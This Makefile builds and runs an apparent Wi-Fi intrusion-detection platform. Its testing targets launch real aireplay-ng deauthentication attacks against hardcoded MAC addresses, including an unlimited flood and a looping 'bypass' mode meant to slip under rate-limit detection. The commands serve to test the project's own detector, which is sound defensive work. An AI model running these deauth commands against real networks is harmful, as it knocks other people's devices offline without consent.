.PHONY: help setup install install-frontend install-backend run-backend run-frontend build build-backend build-frontend clean

# Variables
BACKEND_DIR := wifi-security-backend
FRONTEND_DIR = wifi-security-frontend
ML_DIR = ml-api
PYTHON = venv/bin/python

# Default target
all: buildan1

# Default target
help:
	@echo "================================================================="
	@echo "             Wi-Fi Security Platform - Run Commands"
	@echo "================================================================="
	@echo "Run these in 3 separate terminals:"
	@echo ""
	@echo "  1. make run-backend      : Start the Spring Boot Backend"
	@echo "  2. make run-frontend     : Start the React Dashboard"
	@echo "  3. make run-sniffer      : Start the Packet Capture Engine"
	@echo ""
	@echo "Testing:"
	@echo "  make real-attack         : Test Attack (AP=... CLIENT=... CHANNEL=...)"
	@echo "  make stealth-attack      : Single Deauth Packet (Stealth Mode)"
	@echo ""
	@echo "Setup:"
	@echo "  make setup               : Install dependencies (Run FIRST)"
	@echo "================================================================="

# Installation
setup: install-backend install-frontend install-python

install-backend:
	@echo "--> Setting up Backend (Maven)..."
	@chmod +x $(BACKEND_DIR)/mvnw
	cd $(BACKEND_DIR) && ./mvnw clean install -DskipTests

install-frontend:
	@echo "--> Installing Frontend dependencies (npm)..."
	cd $(FRONTEND_DIR) && npm install

install-python:
	@echo "--> Installing Python dependencies (pip3) with sudo..."
	@sudo pip3 install -r packet-capture/requirements.txt --break-system-packages

# Running - MySQL mode
run-ml:
	@echo "--> Starting ML API (Flask)..."
	cd $(ML_DIR) && $(PYTHON) app.py

run-backend:
	@echo "--> Starting Backend (MySQL) - WITH SUDO FOR SCANNING..."
	@chmod +x $(BACKEND_DIR)/mvnw
	cd $(BACKEND_DIR) && sudo ./mvnw spring-boot:run

run-frontend:
	@echo "--> Starting Frontend..."
	cd $(FRONTEND_DIR) && npm start

run-sniffer:
	@echo "--> Starting Packet Sniffer (Module 2) on $(INTERFACE)..."
	@echo "    Note: Requires sudo password."
	@sudo WIFI_INTERFACE=$(INTERFACE) WIFI_CHANNEL=$(CHANNEL) BACKEND_URL=http://localhost:8080 python3 packet-capture/main.py

attack-test:
	@echo "--> Simulating Deauth Attack Flood (Secure Simulation)..."
	@python3 simulate_attack.py

# Usage: make real-attack AP=9E:A8:2C:C2:1F:D9 CLIENT=94:65:2D:97:25:87 CHANNEL=1
# Default Interface
INTERFACE ?= wlan1
CHANNEL ?= 1

# Usage: make real-attack AP=... CLIENT=...
real-attack:
	$(eval AP ?= PROVIDE_AP_BSSID)
	$(eval CLIENT ?= PROVIDE_CLIENT_MAC)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Real Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@# Ensure interface is on the correct channel
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@sudo aireplay-ng --deauth 10 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one

# Usage: make stealth-attack INTERFACE=wlan1 ...
stealth-attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 94:65:2D:97:25:87)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Stealth Attack (1 packet) on $(INTERFACE) Channel $(CHANNEL)..."
	@# Channel is already set by sniffer
	@sudo aireplay-ng --deauth 1 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one

dev:
	@echo "--> Starting both services in parallel..."
	@echo "-----------------------------------------------------------------"
	@echo "Use Ctrl+C to stop both servers."
	@echo "-----------------------------------------------------------------"
	make -j 2 run-backend run-frontend

# Building
build: build-backend build-frontend

build-backend:
	@echo "--> Building Backend package..."
	cd $(BACKEND_DIR) && ./mvnw clean package -DskipTests

build-frontend:
	@echo "--> Building Frontend bundle..."
	cd $(FRONTEND_DIR) && npm run build

# Cleaning
clean:
	@echo "--> Cleaning Backend..."
	cd $(BACKEND_DIR) && ./mvnw clean
	@echo "--> Cleaning Frontend..."
	rm -rf $(FRONTEND_DIR)/build
	@echo "--> Cleaning Python Cache..."
	find . -type d -name "__pycache__" -exec rm -rf {} +

clean-force:
	@echo "--> Force cleaning Backend with sudo..."
	sudo rm -rf $(BACKEND_DIR)/target
	@echo "--> Cleaning Frontend..."
	rm -rf $(FRONTEND_DIR)/build
	@echo "--> Done!"


# Testing new additions (Layer 1 test & bypass)
run_attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 4C:6F:9C:F4:FA:63)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Continuous Layer 1 Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@sudo aireplay-ng --deauth 0 -a $(AP) -c $(CLIENT) $(INTERFACE)

bypass_attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 4C:6F:9C:F4:FA:63)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Stealth/Bypass Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    (Sending 1 packet every 5 seconds to bypass rate limits but trigger Layer 2 eventually)"
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@while true; do \
		sudo aireplay-ng --deauth 1 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one >/dev/null 2>&1 || true; \
		echo "Sent sparse deauth packet..."; \
		sleep 5; \
	done
